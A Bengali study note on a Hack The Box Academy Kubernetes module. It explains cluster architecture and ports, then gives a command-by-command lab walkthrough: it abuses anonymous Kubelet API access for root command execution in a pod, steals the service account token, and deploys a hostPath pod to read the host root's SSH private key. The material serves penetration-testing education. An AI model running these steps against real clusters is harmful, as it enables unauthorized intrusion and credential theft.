# Kubernetes - [LINK](https://academy.hackthebox.com/app/module/51/section/2444)


বর্তমান সফটওয়্যার ডেভেলপমেন্ট এবং ডেভঅপ্স (DevOps) দুনিয়ায় **Kubernetes (বা K8s)** একটি বৈপ্লবিক প্রযুক্তি। এটি অ্যাপ্লিকেশন ডেপলয় এবং ম্যানেজ করার পদ্ধতিকে সম্পূর্ণ বদলে দিয়েছে। ডকার (Docker) যেখানে কন্টেইনার তৈরি করে, কুবারনেটিস সেখানে সেই কন্টেইনারগুলোকে ম্যানেজ বা অর্কেস্ট্রেট (Orchestrate) করে।

গুগলের তৈরি এই ওপেন-সোর্স আর্কিটেকচারটি খুব দ্রুত অ্যাপ্লিকেশন ডেপলয়, স্কেল এবং ম্যানেজ করতে সাহায্য করে। বর্তমানে এটি Cloud Native Computing Foundation (CNCF) এর অধীনে আছে এবং ইন্ডাস্ট্রির গোল্ড স্ট্যান্ডার্ড হিসেবে পরিচিত। পেনিট্রেশন টেস্টিং করার সময় কুবারনেটিস ক্লাস্টারের কোনো একটি কন্টেইনারে অ্যাক্সেস পাওয়ার সম্ভাবনা অনেক বেশি থাকে, তাই এর সিকিউরিটি সম্পর্কে জানা খুবই জরুরি।

## ১. K8s Concept (কুবারনেটিস কনসেপ্ট)

কুবারনেটিসের মূল কনসেপ্ট হলো **Pod (পড)**। পড হলো কুবারনেটিসের সবচেয়ে ছোট ইউনিট, যার ভেতরে এক বা একাধিক কন্টেইনার থাকতে পারে। প্রতিটি পড একটি আলাদা ভার্চুয়াল মেশিনের মতো আচরণ করে, যার নিজস্ব IP এবং Hostname থাকে।

কুবারনেটিস অনেকগুলো কন্টেইনার ম্যানেজ করার জন্য লোড ব্যালান্সিং, সার্ভিস ডিসকভারি, স্টোরেজ অর্কেস্ট্রেশন এবং সেলফ-হিলিংয়ের মতো সুবিধা দেয়। সিকিউরিটির জন্য এতে Role-Based Access Control (RBAC), Network Policies এবং Security Contexts এর মতো ফিচার রয়েছে।

### ডকার বনাম কুবারনেটিস

| ফাংশন (Function) | ডকার (Docker) | কুবারনেটিস (Kubernetes) |
| --- | --- | --- |
| **প্রাইমারি কাজ** | অ্যাপ্লিকেশন কন্টেইনারাইজ করার প্ল্যাটফর্ম। | কন্টেইনার ম্যানেজ বা অর্কেস্ট্রেট করার টুল। |
| **স্কেলিং** | Docker swarm দিয়ে ম্যানুয়াল স্কেলিং। | অটোমেটিক স্কেলিং। |
| **নেটওয়ার্কিং** | সিঙ্গেল নেটওয়ার্ক। | পলিসিসহ কমপ্লেক্স নেটওয়ার্ক। |
| **স্টোরেজ** | ভলিউম (Volumes)। | স্টোরেজের বিস্তৃত অপশন। |

## ২. K8s Architecture (কুবারনেটিস আর্কিটেকচার)

কুবারনেটিসের আর্কিটেকচার মূলত দুটি ভাগে বিভক্ত:

### ক. Control Plane (মাস্টার নোড)

এটি পুরো ক্লাস্টারকে কন্ট্রোল করে এবং ম্যানেজমেন্ট লেয়ার হিসেবে কাজ করে। এর গুরুত্বপূর্ণ কম্পোনেন্টগুলো হলো:

* **etcd (পোর্ট 2379, 2380):** ক্লাস্টারের যাবতীয় ডেটা এখানে সেভ থাকে।
* **API server (পোর্ট 6443):** এটি হলো কুবারনেটিসের মূল এন্ট্রি পয়েন্ট। সব ধরনের প্রশাসনিক কমান্ড (যেমন `kubectl`) এই সার্ভারের মাধ্যমেই দেওয়া হয়।
* **Scheduler (পোর্ট 10251):** এটি ঠিক করে কোন পড কোন নোডে রান করবে।
* **Controller Manager (পোর্ট 10252):** সিস্টেমের কাঙ্ক্ষিত স্টেট (Desired state) বজায় রাখে।

### খ. Worker Nodes বা Minions (ওয়ার্কার নোড)

এখানেই মূলত অ্যাপ্লিকেশন বা কন্টেইনারগুলো রান হয়। কন্ট্রোল প্লেন থেকে নির্দেশ পেয়ে এরা কাজ করে।

* **Kubelet API (পোর্ট 10250) এবং Read-Only Kubelet API (পোর্ট 10255):** এগুলো নোডের সাথে যোগাযোগ করতে ব্যবহৃত হয়।

## ৩. Authentication and API (অথেনটিকেশন এবং এপিআই)

কুবারনেটিসে ক্লায়েন্ট সার্টিফিকেট, বিয়ারার টোকেন (Bearer tokens), অথবা HTTP বেসিক অথেনটিকেশনের মাধ্যমে ইউজারের পরিচয় নিশ্চিত করা হয়। এরপর **RBAC** এর মাধ্যমে সিদ্ধান্ত নেওয়া হয় যে ইউজার কী কী করতে পারবে।

**দুর্বলতা (Vulnerability):**
কুবারনেটিসে Kubelet এ বাই ডিফল্ট **অ্যানোনিমাস অ্যাক্সেস (Anonymous access)** বা পরিচয়হীন অ্যাক্সেস চালু থাকে। এর মানে হলো, কোনো ভ্যালিড সার্টিফিকেট ছাড়াও Kubelet API এর কাছে রিকোয়েস্ট পাঠানো যায়। এর ফলে সেনসিটিভ ডেটা লিক হওয়া বা আনঅথরাইজড কাজ করার ঝুঁকি থাকে।

**অ্যানোনিমাস রিকোয়েস্ট চেক করা:**

```bash
00Luffy00@k8:~$ curl https://10.129.10.11:6443 -k

```

এখানে যদি `403 Forbidden` আসে, তার মানে সার্ভারটি সরাসরি রুট পাথে অ্যানোনিমাস অ্যাক্সেস ব্লক করে রেখেছে।

## ৪. Exploiting Kubelet API (Kubelet API হ্যাক করা)

Kubelet API এর পোর্ট `10250` খোলা থাকলে আমরা সেখান থেকে পডগুলোর তথ্য বের করতে পারি।

**পডের লিস্ট বের করা:**

```bash
00Luffy00@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

```

এই কমান্ডের আউটপুটে পডের নাম, ক্রিয়েশন টাইম, ইমেজের নাম এবং গতবার অ্যাপ্লাই করা কনফিগারেশন দেখা যায়। এই কনফিগারেশনে অনেক সময় পাসওয়ার্ড, সিক্রেট বা এপিআই টোকেন (API tokens) লুকিয়ে থাকে।

**Kubeletctl ব্যবহার করে পড এক্সট্র্যাক্ট করা:**
`kubeletctl` নামের টুল দিয়ে আমরা খুব সহজেই পডগুলোর লিস্ট এবং তাদের RCE (Remote Code Execution) দুর্বলতা চেক করতে পারি।

```bash
00Luffy00@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

```

এখানে যদি `RCE` কলামে `+` সাইন থাকে, তার মানে আমরা ওই কন্টেইনারে কমান্ড রান করতে পারব!

**কন্টেইনারের ভেতর কমান্ড রান করা:**

```bash
00Luffy00@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)

```

আউটপুট দেখাচ্ছে যে আমরা কন্টেইনারের ভেতর রুট (Root) পারমিশন পেয়ে গেছি!

## ৫. Privilege Escalation (প্রিভিলেজ এসকালেশন করে হোস্টের রুট হওয়া)

কন্টেইনারের ভেতর রুট হলেও আমাদের লক্ষ্য হলো মেইন হোস্ট মেশিনের রুট হওয়া। এর জন্য আমাদের কুবারনেটিসের **সার্ভিস অ্যাকাউন্ট টোকেন (Service account token) এবং সার্টিফিকেট (ca.crt)** লাগবে।

**টোকেন এক্সট্র্যাক্ট করা:**

```bash
00Luffy00@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

```

**সার্টিফিকেট এক্সট্র্যাক্ট করা:**

```bash
00Luffy00@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

```

**পারমিশন চেক করা (Auth can-i):**
টোকেন এবং সার্টিফিকেট পাওয়ার পর আমরা চেক করব কুবারনেটিসে আমাদের কী কী ক্ষমতা আছে।

```bash
00Luffy00@k8:~$ export token=`cat k8.token`
00Luffy00@k8:~$kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

```

যদি আমরা দেখি যে আমাদের নতুন পড তৈরি করার (create pod) পারমিশন আছে, তবে আমরা প্রিভিলেজ এসকালেশন করতে পারব।

### ম্যালিশিয়াস পড তৈরি এবং হোস্ট হ্যাক করা

আমরা এমন একটি YAML ফাইল (`privesc.yaml`) তৈরি করব, যা একটি নতুন কন্টেইনার বানাবে এবং হোস্ট মেশিনের পুরো হার্ডডিস্ককে (রুট ডিরেক্টরি `/`) কন্টেইনারের `/root` ফোল্ডারের সাথে মাউন্ট করে দেবে।

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

**নতুন পড তৈরি করা:**

```bash
00Luffy00@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

```

**হোস্টের রুট SSH Key চুরি করা:**
পড রান হওয়ার পর আমরা এর মাধ্যমে হোস্ট মেশিনের রুট ইউজারের ফাইলগুলোতে অ্যাক্সেস পাব।

```bash
00Luffy00@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

```

বুম! আমরা হোস্ট মেশিনের রুট প্রাইভেট কি (SSH Private Key) পেয়ে গেছি! এখন এটি ব্যবহার করে আমরা সরাসরি হোস্ট মেশিনে রুট হিসেবে লগইন করতে পারব।
